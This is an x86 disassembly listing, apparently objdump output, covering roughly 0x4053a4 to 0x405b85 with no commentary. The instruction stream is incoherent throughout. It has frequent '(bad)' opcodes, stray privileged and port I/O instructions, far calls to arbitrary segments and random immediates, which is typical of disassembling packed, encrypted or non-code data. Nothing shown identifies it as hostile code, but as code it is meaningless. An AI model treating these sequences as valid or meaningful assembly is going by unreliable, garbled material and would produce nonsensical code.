  4053a4:	imul   ecx,DWORD PTR [edi-0x1e],0x4cb79914
  4053ab:	into   
  4053ac:	xor    DWORD PTR [edx+0x6b0a889a],ebp
  4053b2:	(bad)  
  4053b3:	jo     0x4053db
  4053b5:	rcl    BYTE PTR [edi-0x7d],1
  4053b8:	adc    dh,dl
  4053ba:	mov    ebx,DWORD PTR [ebx-0x42]
  4053bd:	xor    esi,esp
  4053bf:	push   0x65
  4053c1:	leave  
  4053c2:	mov    cl,0xea
  4053c4:	xor    esi,DWORD PTR [edx+0x1ad52c3c]
  4053ca:	(bad)
  4053cf:	mov    esp,0x54dc634c
  4053d4:	pop    ds
  4053d5:	lahf   
  4053d6:	jle    0x405373
  4053d8:	add    BYTE PTR [ebx],cl
  4053da:	gs jnp 0x40538b
  4053dd:	loopne 0x405456
  4053df:	xor    edx,DWORD PTR [ebx+ecx*4-0x24]
  4053e3:	clc    
  4053e4:	aaa    
  4053e5:	jne    0x4053f3
  4053e7:	and    ah,BYTE PTR [esi+0x5e]
  4053ea:	jecxz  0x40544b
  4053ec:	mov    eax,edx
  4053ee:	leave  
  4053ef:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4053f1:	das    
  4053f2:	fwait
  4053f3:	into   
  4053f4:	imul   esi,DWORD PTR [ebx+0x67],0x61
  4053f8:	es cmp ch,al
  4053fb:	pop    ds
  4053fc:	mov    eax,ds:0x4c19302d
  405401:	mov    bl,0xbf
  405403:	cmp    ebp,DWORD PTR [ebx]
  405405:	dec    edi
  405406:	pop    esi
  405407:	inc    esp
  405408:	sbb    ebp,eax
  40540a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40540b:	cmc    
  40540c:	sahf   
  40540d:	aam    0x1e
  40540f:	sbb    al,0x29
  405411:	and    eax,0x13c348ae
  405416:	and    dl,BYTE PTR [esi-0xb00b02]
  40541c:	pop    ecx
  40541d:	adc    edi,DWORD PTR [edx+ebp*1+0x6e]
  405421:	xchg   ebp,eax
  405422:	ret    
  405423:	mov    ah,0x1c
  405425:	and    DWORD PTR ds:0x5f71cf2,edx
  40542b:	ds das 
  40542d:	mov    eax,0x60f93bfa
  405432:	inc    DWORD PTR ds:0xe7683d62
  405439:	adc    DWORD PTR [esi-0x5908f798],eax
  40543f:	repnz or bh,BYTE PTR [edx]
  405442:	shr    BYTE PTR cs:[ecx-0x4175a161],1
  405449:	inc    edx
  40544a:	jo     0x405451
  40544c:	and    esp,DWORD PTR [edx+0x26]
  40544f:	sar    DWORD PTR [edi],cl
  405451:	and    al,0x68
  405453:	pusha  
  405454:	test   eax,0x188de9a7
  405459:	ds xchg ecx,eax
  40545b:	add    ch,bl
  40545d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40545e:	int    0xba
  405460:	and    BYTE PTR [edi-0x17722a13],cl
  405466:	popf   
  405467:	call   0x28e0:0xf6c21df0
  40546e:	clc    
  40546f:	pop    ds
  405470:	dec    esi
  405471:	add    esi,ebx
  405473:	xor    al,0x81
  405475:	push   ds
  405476:	mov    eax,ds:0xfa842a61
  40547b:	add    al,0x9f
  40547d:	das    
  40547e:	scas   al,BYTE PTR es:[edi]
  40547f:	pop    edx
  405480:	push   edx
  405481:	jae    0x405449
  405483:	dec    esi
  405484:	std    
  405485:	mov    al,ds:0x61c4cc9b
  40548a:	shr    DWORD PTR [eax-0x157ce442],cl
  405490:	scas   al,BYTE PTR es:[edi]
  405491:	ficomp WORD PTR [esi]
  405493:	or     bl,BYTE PTR [edi+0x44]
  405496:	(bad)  
  405497:	xor    DWORD PTR [ebp+edx*1+0x3d],ebp
  40549b:	hlt    
  40549c:	std    
  40549d:	out    0x87,eax
  40549f:	repz mov ecx,0xbfb51585
  4054a5:	mov    esi,0xbaf8399e
  4054aa:	mov    cl,0xfe
  4054ac:	mov    bh,0x5b
  4054ae:	popf   
  4054af:	enter  0x2f0e,0x3b
  4054b3:	sbb    cl,dl
  4054b5:	retf   0xc23e
  4054b8:	mov    ds:0x6e0a8aac,eax
  4054bd:	test   edx,esi
  4054bf:	dec    eax
  4054c0:	dec    ebx
  4054c1:	adc    al,0x7c
  4054c3:	xchg   ebp,eax
  4054c4:	test   eax,0xe19bbac4
  4054c9:	inc    ebx
  4054ca:	add    al,0xd8
  4054cc:	std    
  4054cd:	dec    ebx
  4054ce:	mov    ch,BYTE PTR [ebp-0x73d669fb]
  4054d4:	mov    esp,0xdb33d723
  4054d9:	mov    ds,WORD PTR [eax+0x70]
  4054dc:	add    dh,al
  4054de:	pop    eax
  4054df:	mov    ch,BYTE PTR [esi*2+0x30deeaa4]
  4054e6:	sbb    eax,0xee21f186
  4054eb:	pop    eax
  4054ec:	push   esi
  4054ed:	or     eax,0x295aad78
  4054f2:	(bad)  
  4054f4:	cmc    
  4054f5:	test   BYTE PTR [eax],ah
  4054f7:	fiadd  WORD PTR es:[ecx]
  4054fa:	jl     0x405579
  4054fc:	rcr    BYTE PTR gs:[eax-0x63],0x4f
  405501:	push   esi
  405502:	xchg   edi,eax
  405503:	stos   DWORD PTR es:[edi],eax
  405504:	iret   
  405505:	jmp    0x36cd:0xf7250344
  40550c:	inc    eax
  40550d:	out    dx,al
  40550e:	pop    edx
  40550f:	icebp  
  405510:	mov    ecx,0x11f7f336
  405515:	repz aas 
  405517:	test   BYTE PTR [edx+0x1b],dh
  40551a:	adc    BYTE PTR [eax+0x69],0xb7
  40551e:	dec    ebp
  40551f:	(bad)  
  405520:	pop    edx
  405521:	or     al,BYTE PTR [ebx-0x6b7f2b37]
  405527:	mov    eax,ds:0x21923563
  40552c:	jge    0x40556e
  40552e:	cmp    al,cl
  405530:	pop    bx
  405532:	and    ecx,0x22
  405535:	sbb    DWORD PTR [ebx-0x766c3492],esp
  40553b:	pusha  
  40553c:	data16 arpl WORD PTR [edx-0x10],cx
  405540:	addr16 call 0x31cf5782
  405546:	nop
  405547:	repnz imul ebx,DWORD PTR [ecx+0x3f741f13],0x3
  40554f:	rcr    DWORD PTR [ebx-0x63],cl
  405552:	jge    0x40556b
  405554:	and    ebp,DWORD PTR [edi]
  405556:	cmp    ebx,DWORD PTR [esi+edi*4+0x60]
  40555a:	cld    
  40555b:	mov    esp,0xd755c1fc
  405560:	xor    ecx,DWORD PTR [edx]
  405562:	clc    
  405563:	(bad)  
  405564:	out    0x55,al
  405566:	lods   eax,DWORD PTR ds:[si]
  405568:	push   esp
  405569:	jmp    0xe3f290f5
  40556e:	xchg   esp,eax
  40556f:	fnsave [ecx]
  405571:	jle    0x405593
  405573:	ss push ss
  405575:	fimul  WORD PTR [eax-0x46]
  405578:	sub    esi,esp
  40557a:	(bad)  
  40557b:	js     0x40558e
  40557d:	pop    edi
  40557e:	popf   
  40557f:	push   es
  405580:	jmp    0xf45d39e8
  405585:	fisttp WORD PTR [ebx-0x31]
  405588:	mov    BYTE PTR [ecx-0x78],cl
  40558b:	lds    esp,FWORD PTR [esi+0xa987983]
  405591:	adc    cl,BYTE PTR ds:0xcc8ce451
  405597:	cmp    eax,0x91e83f98
  40559c:	call   0xd653:0xbbde6fab
  4055a3:	daa    
  4055a4:	sub    ecx,DWORD PTR [edx]
  4055a6:	jnp    0x4055b6
  4055a8:	xlat   BYTE PTR cs:[ebx]
  4055aa:	mov    esi,0x380cb333
  4055af:	jmp    0x9ca8:0x180948d7
  4055b6:	mov    ch,0x45
  4055b8:	cwde   
  4055b9:	jmp    0x405561
  4055bb:	mov    dl,0xcc
  4055bd:	cld    
  4055be:	jbe    0x4055d4
  4055c0:	call   0xd14f:0xb4894561
  4055c7:	outs   dx,DWORD PTR es:[esi]
  4055c9:	or     eax,0xbe9aca9c
  4055ce:	js     0x4055d3
  4055d0:	test   al,0xfd
  4055d2:	xor    al,0x1
  4055d4:	mov    ah,0x1
  4055d6:	mov    ds:0xe931f4a7,al
  4055db:	iret   
  4055dc:	test   eax,0x5d7ef18d
  4055e1:	mov    dh,0x7b
  4055e3:	ret    
  4055e4:	pop    ecx
  4055e5:	xchg   edi,eax
  4055e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055e7:	inc    ebp
  4055e8:	retf   0xbaa2
  4055eb:	iret   
  4055ec:	imul   ebx,DWORD PTR [eax],0xb597006a
  4055f2:	dec    BYTE PTR ds:0xcc6d3220
  4055f8:	jne    0x4055d7
  4055fa:	adc    al,0xaa
  4055fc:	sbb    esi,edi
  4055fe:	test   edx,ebp
  405600:	psadbw mm5,QWORD PTR [ebx-0x4e]
  405604:	adc    BYTE PTR [eax],ch
  405606:	(bad)  
  405607:	xor    eax,0x65731c89
  40560c:	in     al,0x3c
  40560e:	ins    BYTE PTR es:[edi],dx
  40560f:	ins    DWORD PTR es:[edi],dx
  405610:	or     ch,BYTE PTR [esi+0x521d6853]
  405616:	add    eax,0x1ebd0ade
  40561b:	sub    ah,BYTE PTR [ecx-0x15]
  40561e:	outs   dx,BYTE PTR ds:[esi]
  40561f:	repnz xor al,BYTE PTR [ecx]
  405622:	jae    0x40562c
  405624:	shr    edx,0x50
  405627:	fcomp  DWORD PTR ds:0xba3b1b7a
  40562d:	xchg   ebp,eax
  40562e:	(bad)  
  40562f:	or     eax,0xb7e7aa9e
  405634:	and    al,0xc4
  405636:	bound  esp,QWORD PTR [eax-0x34]
  405639:	sub    cl,dl
  40563b:	jl     0x40562b
  40563d:	push   eax
  40563e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40563f:	mov    ebp,0xf4de12a3
  405644:	bound  ecx,QWORD PTR [eax-0x30]
  405647:	out    dx,al
  405648:	in     al,dx
  405649:	push   ds
  40564a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40564b:	mov    cl,BYTE PTR [ecx+0x6460ff1c]
  405651:	(bad)  
  405652:	xchg   edi,eax
  405653:	mov    ebx,0xf8e8e59c
  405658:	repz xchg edx,eax
  40565a:	stos   BYTE PTR es:[edi],al
  40565b:	arpl   dx,ax
  40565d:	mov    ah,0xe2
  40565f:	xchg   DWORD PTR [esi+0x6c],esp
  405662:	sbb    al,BYTE PTR [ecx-0x5c]
  405665:	test   DWORD PTR [esp+ebx*4],0xf448535c
  40566c:	mov    cl,0xc2
  40566e:	xchg   esp,eax
  40566f:	adc    ecx,DWORD PTR [esi+0x28]
  405672:	sbb    eax,edi
  405674:	adc    BYTE PTR [ebx+esi*4+0x55],bl
  405678:	or     ebx,DWORD PTR [ebx-0x38cb05dc]
  40567e:	test   DWORD PTR [edi-0x57],0x4cf67359
  405685:	jae    0x405633
  405687:	mov    al,0x3
  405689:	xchg   ebp,ebp
  40568b:	inc    esp
  40568c:	inc    ebp
  40568d:	pop    es
  40568e:	vcmpnle_uqss xmm7,xmm6,xmm1
  405693:	push   edx
  405694:	adc    al,0xf2
  405696:	add    bh,bh
  405698:	inc    ebp
  405699:	cmovb  ebp,DWORD PTR [ebx-0x7f6e0b09]
  4056a0:	out    dx,eax
  4056a1:	es xchg ebx,eax
  4056a3:	pop    es
  4056a4:	in     al,dx
  4056a5:	std    
  4056a6:	jg     0x40566a
  4056a8:	mov    edi,0x4f1ab9ce
  4056ad:	jecxz  0x40566b
  4056af:	xchg   edi,esp
  4056b1:	or     edx,DWORD PTR [eax-0xe]
  4056b4:	pop    ds
  4056b5:	(bad)  
  4056b6:	cld    
  4056b7:	xchg   esp,eax
  4056b8:	add    DWORD PTR [esi],ecx
  4056ba:	xchg   BYTE PTR [ebx],al
  4056bc:	clc    
  4056bd:	ror    BYTE PTR [ecx],1
  4056bf:	popf   
  4056c0:	outs   dx,BYTE PTR ds:[esi]
  4056c1:	sbb    DWORD PTR [edx+0x38],edx
  4056c4:	cmp    dh,BYTE PTR [edi-0x2fc7f606]
  4056ca:	ret    0x7384
  4056cd:	jns    0x405706
  4056cf:	sbb    eax,ebx
  4056d1:	push   ecx
  4056d2:	gs stc 
  4056d4:	pop    ebp
  4056d5:	mov    ah,0xd7
  4056d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056d8:	rcl    BYTE PTR [edx-0x493e2a26],1
  4056de:	pop    ecx
  4056df:	inc    esi
  4056e0:	pop    esp
  4056e1:	fld    QWORD PTR [ecx-0x1c8cd182]
  4056e7:	push   ecx
  4056e8:	mov    ch,BYTE PTR gs:[ebx+0x27febf27]
  4056ef:	leave  
  4056f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056f1:	sub    edx,DWORD PTR [ebp+eax*4-0x346a65f9]
  4056f8:	xchg   ebp,eax
  4056f9:	or     eax,0xc1b68be3
  4056fe:	rcr    bh,cl
  405700:	mov    ch,0x49
  405702:	push   edi
  405703:	sub    bh,BYTE PTR [edi+0x71c77ce9]
  405709:	jg     0x4056d3
  40570b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40570c:	add    DWORD PTR [ebx+esi*4-0x29d349ba],edi
  405713:	and    DWORD PTR [eax-0x64],0x6d6cc335
  40571a:	cdq    
  40571b:	mov    edi,0xf5eead2e
  405720:	cmc    
  405721:	(bad)  
  405722:	mov    ebp,0xd17e29eb
  405727:	call   0x8040:0x46e194fc
  40572e:	shl    cl,0x8b
  405731:	rol    DWORD PTR [ebp+0x2fe3260],cl
  405737:	jnp    0x4057b1
  405739:	pop    edi
  40573a:	(bad)  
  40573b:	jns    0x4056fe
  40573d:	adc    BYTE PTR [ebx],dh
  40573f:	dec    ebp
  405740:	call   0x5277:0xfa797438
  405747:	divps  xmm6,XMMWORD PTR [edx]
  40574a:	mov    es,WORD PTR [esi+ebp*2]
  40574d:	mov    dl,0x6e
  40574f:	loopne 0x405747
  405751:	bound  ecx,QWORD PTR [ecx]
  405753:	cwde   
  405754:	cli    
  405755:	and    eax,0x686d7ea7
  40575a:	pop    eax
  40575b:	out    0x5c,al
  40575d:	xchg   edx,eax
  40575e:	mov    ah,0x0
  405760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405761:	(bad)  
  405762:	add    BYTE PTR [esi],0xc
  405765:	jecxz  0x40574d
  405767:	daa    
  405768:	jno    0x4057bd
  40576a:	sar    ebx,1
  40576c:	das    
  40576d:	mov    eax,0xb22b0af0
  405772:	(bad)  
  405773:	pop    esp
  405774:	data16 fwait
  405776:	jle    0x405759
  405778:	mov    eax,ds:0x6b469240
  40577d:	inc    BYTE PTR [edi-0x5d]
  405780:	stos   DWORD PTR es:[edi],eax
  405781:	and    eax,0x1ac249a3
  405786:	or     eax,0x4c3a85c7
  40578b:	enter  0x1101,0xf
  40578f:	dec    esi
  405790:	pop    ebp
  405791:	add    al,0x14
  405793:	cmp    eax,0x5012e0e3
  405798:	dec    esi
  405799:	pushf  
  40579a:	fisttp DWORD PTR [eax]
  40579c:	aas    
  40579d:	dec    ebx
  40579e:	in     eax,0x4b
  4057a0:	dec    edi
  4057a1:	xchg   ebx,eax
  4057a2:	xchg   esp,eax
  4057a3:	shr    DWORD PTR [esi],1
  4057a5:	sbb    eax,0xb87bc590
  4057aa:	shr    DWORD PTR [edi],0x99
  4057ad:	pop    ds
  4057ae:	test   eax,0x5ae4e0d5
  4057b3:	stc    
  4057b4:	cdq    
  4057b5:	outs   dx,WORD PTR ds:[esi]
  4057b7:	mov    ds:0x7e66378c,eax
  4057bc:	cwde   
  4057bd:	daa    
  4057be:	test   DWORD PTR [ecx-0x21],0x3e43c399
  4057c5:	das    
  4057c6:	outs   dx,DWORD PTR ds:[esi]
  4057c7:	or     DWORD PTR [ebp-0x24],eax
  4057ca:	mov    edx,0x86141460
  4057cf:	jecxz  0x4057e6
  4057d1:	mov    dh,0x4d
  4057d3:	xchg   esp,eax
  4057d4:	jne    0x4057df
  4057d6:	mov    dl,0x25
  4057d8:	lods   eax,DWORD PTR ds:[esi]
  4057d9:	int    0x51
  4057db:	ds inc esp
  4057dd:	jmp    0x5dc25969
  4057e2:	call   0x17d67f41
  4057e7:	push   ebx
  4057e8:	outs   dx,BYTE PTR ds:[esi]
  4057e9:	data16 (bad) 
  4057ec:	add    DWORD PTR [eax],0x7b6bae69
  4057f2:	add    al,0x11
  4057f4:	in     al,0x75
  4057f6:	adc    cl,bh
  4057f8:	jmp    0x50ed:0x16636218
  4057ff:	mov    al,ds:0xc73b46d1
  405804:	xchg   edx,eax
  405805:	cld    
  405806:	xor    DWORD PTR [edi-0x4b118897],edi
  40580c:	js     0x4057a4
  40580e:	ins    DWORD PTR es:[edi],dx
  40580f:	cmp    eax,0x902542e6
  405814:	mov    ds:0x5149bb81,al
  405819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40581a:	xchg   esi,eax
  40581b:	mov    esi,0xc0e9f464
  405820:	test   ebx,esi
  405822:	ins    BYTE PTR es:[edi],dx
  405823:	mov    ah,0x5d
  405825:	jmp    0x4057f5
  405827:	jnp    0x405855
  405829:	jg     0x405814
  40582b:	add    al,0xf1
  40582d:	mov    al,ds:0xa63e0093
  405832:	call   0xc164764d
  405837:	adc    edx,DWORD PTR [esi+0x64]
  40583a:	sbb    DWORD PTR [ecx-0x151a007d],edx
  405840:	(bad)  
  405841:	cmp    eax,0xcecaa60
  405846:	mov    BYTE PTR [edx+0x24a50abf],al
  40584c:	pop    eax
  40584d:	dec    ebx
  40584e:	push   ebx
  40584f:	ror    DWORD PTR [edx],1
  405851:	jb     0x40589f
  405853:	int    0xc
  405855:	stos   BYTE PTR es:[edi],al
  405856:	in     al,0xd4
  405858:	dec    edi
  405859:	(bad)  
  40585a:	iret   
  40585b:	cld    
  40585c:	adc    eax,0x2c0b0492
  405861:	repnz push eax
  405863:	push   es
  405864:	xchg   ecx,eax
  405865:	mov    es,WORD PTR ds:0x3ebf784
  40586b:	std    
  40586c:	cmp    edx,edi
  40586e:	cmp    dl,BYTE PTR [esi+edi*8]
  405871:	sub    edx,DWORD PTR [edx+ebp*4]
  405874:	dec    ecx
  405875:	retf   0x6600
  405878:	iret   
  405879:	adc    bl,BYTE PTR [ebx-0x61]
  40587c:	leave  
  40587d:	or     eax,0x83144996
  405882:	sbb    ch,BYTE PTR ds:0xa6dd176e
  405888:	xchg   DWORD PTR [eax+0x6a18ef46],ecx
  40588e:	and    al,0x4c
  405890:	ins    BYTE PTR es:[edi],dx
  405891:	nop
  405892:	aaa    
  405893:	ret    0x5e8b
  405896:	inc    edi
  405897:	rcl    BYTE PTR [ebp-0x4],cl
  40589a:	aaa    
  40589b:	iret   
  40589c:	repz hlt 
  40589e:	or     DWORD PTR [ebx-0x35],0xe3012344
  4058a5:	mov    ebx,0xdf013631
  4058aa:	cmp    DWORD PTR [eax+edx*8+0x14],esp
  4058ae:	mov    eax,0x20384a83
  4058b3:	mov    ebp,DWORD PTR [edx]
  4058b5:	sbb    DWORD PTR [eax+0x28ffc930],eax
  4058bb:	repnz inc esp
  4058bd:	adc    DWORD PTR [edi],edi
  4058bf:	fwait
  4058c0:	sbb    eax,0x973a1737
  4058c5:	outs   dx,BYTE PTR ds:[esi]
  4058c6:	enter  0x2aee,0xb8
  4058ca:	in     eax,dx
  4058cb:	outs   dx,BYTE PTR ds:[esi]
  4058cc:	sub    ch,0x66
  4058cf:	loop   0x4058f6
  4058d1:	xor    al,0x55
  4058d3:	inc    esp
  4058d4:	out    0x45,eax
  4058d6:	jne    0x4058b7
  4058d8:	sar    ch,1
  4058da:	or     esp,esp
  4058dc:	push   esp
  4058dd:	mov    ds:0x1a3b6e5c,eax
  4058e2:	mov    ah,0x29
  4058e4:	(bad)  
  4058e5:	push   edi
  4058e6:	push   cs
  4058e7:	shl    DWORD PTR [edx+0xf89aa0e],cl
  4058ed:	push   esi
  4058ee:	inc    edx
  4058ef:	fiadd  DWORD PTR [esi]
  4058f1:	lds    ecx,FWORD PTR [esi]
  4058f3:	and    dl,bh
  4058f5:	jno    0x405903
  4058f7:	jmp    0x494f:0x551b8a3
  4058fe:	(bad)  [edx]
  405900:	mov    al,0x1
  405902:	or     al,0x86
  405904:	and    al,0xd9
  405906:	cwde   
  405907:	dec    esp
  405908:	jecxz  0x40592b
  40590a:	(bad)  
  40590b:	mov    ch,0x90
  40590d:	inc    esi
  40590e:	popa   
  40590f:	sbb    bh,al
  405911:	xchg   edi,eax
  405912:	je     0x405936
  405914:	imul   esp,DWORD PTR ds:0xbdd25c27,0x40
  40591b:	mov    esi,ebx
  40591d:	fiadd  WORD PTR [ecx-0x68d49069]
  405923:	in     al,0x59
  405925:	fstp   st(0)
  405927:	cdq    
  405928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405929:	hlt    
  40592a:	ins    DWORD PTR es:[edi],dx
  40592b:	sbb    eax,0x75f42eba
  405930:	aad    0xe1
  405932:	in     al,0x99
  405934:	and    ebp,ecx
  405936:	call   0x1bbf:0xa84aa1d0
  40593d:	lods   al,BYTE PTR ds:[esi]
  40593e:	mov    DWORD PTR fs:[esi+0x49],ecx
  405942:	mov    ah,0x35
  405944:	jle    0x405943
  405946:	push   es
  405947:	mov    cl,0xf1
  405949:	leave  
  40594a:	fimul  WORD PTR [edi-0x3a180a2a]
  405950:	mov    ah,0x25
  405952:	inc    ecx
  405953:	mov    dl,0xac
  405955:	xchg   BYTE PTR ss:[esi+eiz*4+0x1c],bh
  40595a:	jnp    0x4059b7
  40595c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40595d:	add    eax,0xf790b6ab
  405962:	pop    ds
  405963:	fild   DWORD PTR [ecx+ebp*4+0x5042910b]
  40596a:	addr16 xchg esp,eax
  40596c:	call   0x52fb:0x9a67b61c
  405973:	inc    ebx
  405974:	jg     0x4059b8
  405976:	in     eax,dx
  405977:	push   edx
  405978:	sub    al,BYTE PTR [edi+0x2d]
  40597b:	scas   al,BYTE PTR es:[edi]
  40597c:	mov    edi,0xf87f9033
  405981:	sub    BYTE PTR [edx],ch
  405983:	neg    DWORD PTR [esi+0x694ee741]
  405989:	xor    ebx,DWORD PTR [ebp-0x24]
  40598c:	push   0xffffff80
  40598e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40598f:	call   0x55854a71
  405994:	xchg   ecx,eax
  405995:	mov    eax,ds:0xc130ed5
  40599a:	lods   al,BYTE PTR ds:[esi]
  40599b:	aas    
  40599c:	mov    edi,0xb457c7c
  4059a1:	into   
  4059a2:	jp     0x405979
  4059a4:	xor    ch,ah
  4059a6:	sub    esp,DWORD PTR [ebp+0x63b0e072]
  4059ac:	sub    cl,BYTE PTR [edi]
  4059ae:	mov    ah,0xb4
  4059b0:	pop    edx
  4059b1:	retf   0x8910
  4059b4:	test   al,0x72
  4059b6:	(bad)  
  4059b7:	popa   
  4059b8:	imul   ecx,DWORD PTR [edi+0x65e0cecb],0x6bfcbedf
  4059c2:	sti    
  4059c3:	ss pushf 
  4059c5:	addr16 ret 0x734e
  4059c9:	dec    eax
  4059ca:	push   0x3afaadc2
  4059cf:	outs   dx,DWORD PTR ds:[esi]
  4059d0:	nop
  4059d1:	inc    eax
  4059d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059d3:	jns    0x405a34
  4059d5:	xchg   edx,eax
  4059d6:	xor    cl,al
  4059d8:	(bad)  
  4059d9:	in     eax,0xc8
  4059db:	xchg   edx,eax
  4059dc:	dec    eax
  4059dd:	cmp    DWORD PTR [ebx],eax
  4059df:	cwde   
  4059e0:	popf   
  4059e1:	enter  0xa8af,0x64
  4059e5:	add    ebp,esp
  4059e7:	pusha  
  4059e8:	push   cs
  4059e9:	std    
  4059ea:	ja     0x405a43
  4059ec:	xchg   edx,eax
  4059ed:	lods   eax,DWORD PTR ds:[esi]
  4059ee:	(bad)  
  4059f0:	loope  0x405a2a
  4059f2:	xor    ah,BYTE PTR [edi+0x5743c567]
  4059f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059f9:	ss das 
  4059fb:	add    al,0x94
  4059fd:	pushf  
  4059fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059ff:	mov    ebp,0x99ddbd57
  405a04:	mov    ecx,0xa103e4cf
  405a09:	pop    edi
  405a0a:	(bad)  
  405a0b:	ror    DWORD PTR gs:[ebp-0x13],1
  405a0f:	pop    eax
  405a10:	push   eax
  405a11:	add    eax,0xa65f8a7a
  405a16:	jno    0x4059cf
  405a18:	push   0xba52aa9c
  405a1d:	inc    esi
  405a1e:	lods   eax,DWORD PTR ds:[esi]
  405a1f:	jne    0x4059cf
  405a21:	mov    ebx,0xe1886aa6
  405a26:	outs   dx,BYTE PTR ds:[esi]
  405a27:	xor    edi,DWORD PTR [eax+0x2450f635]
  405a2d:	xchg   esi,eax
  405a2e:	mov    edx,0x6d7f6dee
  405a33:	or     eax,0xcb0bfc3
  405a38:	loope  0x405a9f
  405a3a:	inc    esp
  405a3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a3c:	sahf   
  405a3d:	cld    
  405a3e:	shr    cl,1
  405a40:	pop    es
  405a41:	push   edx
  405a42:	dec    ebx
  405a43:	and    eax,0xa185f6b5
  405a48:	pop    ss
  405a49:	aaa    
  405a4a:	adc    ebx,ebx
  405a4c:	call   FWORD PTR [ebx]
  405a4e:	inc    edx
  405a4f:	ss jle 0x405a35
  405a52:	ins    BYTE PTR es:[edi],dx
  405a53:	ret    
  405a54:	ins    BYTE PTR es:[edi],dx
  405a55:	push   ebp
  405a56:	or     BYTE PTR ds:0x2dd4da2b,0x4c
  405a5d:	mov    edi,0x51155f8f
  405a62:	and    cl,BYTE PTR [ebx+0x14e889aa]
  405a68:	jno    0x405ac8
  405a6a:	outs   dx,DWORD PTR ds:[esi]
  405a6b:	daa    
  405a6c:	jp     0x405ad1
  405a6e:	mov    ds:0xbf9905f,eax
  405a73:	aaa    
  405a74:	mov    edx,0x2cf136e
  405a79:	dec    esi
  405a7a:	inc    esi
  405a7b:	ret    
  405a7c:	(bad)  
  405a7d:	cmp    al,0x27
  405a7f:	push   esi
  405a80:	or     dl,BYTE PTR [eax-0x2e348bc8]
  405a86:	jae    0x405a2a
  405a88:	inc    edi
  405a89:	cli    
  405a8a:	mov    ecx,0x6b2666a1
  405a8f:	out    dx,al
  405a90:	les    ebx,FWORD PTR [ebx-0x5]
  405a93:	pop    esi
  405a94:	inc    ecx
  405a95:	adc    esi,DWORD PTR [eax+ecx*2-0x7c831f12]
  405a9c:	adc    DWORD PTR [esi-0x7b706916],ebp
  405aa2:	jle    0x405a60
  405aa4:	jo     0x405ae9
  405aa6:	xchg   bl,dh
  405aa8:	push   0x442ecae2
  405aad:	jg     0x405ad4
  405aaf:	cwde   
  405ab0:	loop   0x405ad6
  405ab2:	mov    esi,0x86b97192
  405ab7:	inc    ebp
  405ab8:	and    ah,BYTE PTR [esi+esi*2+0x5bc3e16d]
  405abf:	int    0x95
  405ac1:	repz sub esp,DWORD PTR [ebx+0x1e410241]
  405ac8:	xchg   esp,eax
  405ac9:	int3   
  405aca:	sub    al,0x26
  405acc:	mov    cl,0x9e
  405ace:	xchg   edx,eax
  405acf:	(bad)  
  405ad0:	retf   
  405ad1:	int3   
  405ad2:	jmp    0xfceb:0x1e217b99
  405ad9:	cmp    al,0x3c
  405adb:	dec    ebx
  405adc:	xlat   BYTE PTR ds:[ebx]
  405add:	rol    BYTE PTR [ecx+0xe1cf585],0xc0
  405ae4:	dec    eax
  405ae5:	xchg   ebp,eax
  405ae6:	(bad)  
  405ae8:	mul    BYTE PTR [edi+0x758c003b]
  405aee:	sbb    al,al
  405af0:	retf   0xa87c
  405af3:	stos   DWORD PTR es:[edi],eax
  405af4:	in     al,dx
  405af5:	dec    edi
  405af6:	xor    al,0xbf
  405af8:	sub    DWORD PTR [eax+0x7f],ebx
  405afb:	adc    esi,DWORD PTR [esi+0x14c06528]
  405b01:	lock xchg ecx,eax
  405b03:	int3   
  405b04:	ss stos BYTE PTR es:[edi],al
  405b06:	add    DWORD PTR [ecx+0x57],edx
  405b09:	mov    al,ds:0x9540f5d1
  405b0e:	inc    edi
  405b0f:	jg     0x405af8
  405b11:	dec    edi
  405b12:	dec    esp
  405b13:	push   esi
  405b14:	fs aaa 
  405b16:	outs   dx,DWORD PTR ds:[esi]
  405b17:	jae    0x405ac2
  405b19:	sbb    al,0xb9
  405b1b:	pcmpgtb mm5,QWORD PTR [ecx]
  405b1e:	fistp  WORD PTR [eax]
  405b20:	push   edi
  405b21:	add    DWORD PTR [esi+edi*2+0x50ba34],esi
  405b28:	inc    ebp
  405b29:	push   0x27
  405b2b:	jmp    0x8c85:0x2eb722e4
  405b32:	adc    eax,ecx
  405b34:	sub    ebp,DWORD PTR [esp+ebx*4]
  405b37:	add    al,0x9e
  405b39:	retf   
  405b3a:	jno    0x405aeb
  405b3c:	call   FWORD PTR [esi+0x22a43b45]
  405b42:	push   edx
  405b43:	outs   dx,BYTE PTR ds:[esi]
  405b44:	mov    eax,ds:0x9e251902
  405b49:	cmp    DWORD PTR [edx],edi
  405b4b:	icebp  
  405b4c:	or     edx,DWORD PTR [edx]
  405b4e:	js     0x405ae7
  405b50:	repnz clc 
  405b52:	push   0xfa8ce2dc
  405b57:	push   es
  405b58:	jge    0x405b0a
  405b5a:	mov    eax,ds:0x38219585
  405b5f:	push   edx
  405b60:	sti    
  405b61:	add    al,BYTE PTR [ecx+0x154d7f6a]
  405b67:	ins    BYTE PTR es:[edi],dx
  405b68:	add    DWORD PTR ds:[eax+0x20],eax
  405b6c:	in     al,dx
  405b6d:	and    esp,DWORD PTR [eax+0x46adfd7d]
  405b73:	ja     0x405b98
  405b75:	push   eax
  405b76:	mov    dh,0x68
  405b78:	(bad)  
  405b7a:	mov    ds:0x8981bc06,eax
  405b7f:	pop    eax
  405b80:	dec    ecx
  405b81:	jne    0x405b7a
  405b83:	and    al,0xbc
  405b85:	xchg   ebp,eax
